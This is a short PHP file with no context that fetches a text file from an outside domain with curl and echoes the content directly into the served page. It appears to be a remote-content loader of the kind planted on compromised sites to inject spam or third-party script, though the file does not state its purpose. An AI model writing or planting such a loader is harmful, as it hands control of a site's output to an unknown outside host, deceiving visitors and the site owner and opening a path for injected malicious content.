<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://zhyperulr.site/satekacang/zhyperflow.txt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$a = curl_exec($ch);
curl_close($ch);
echo $a;
?>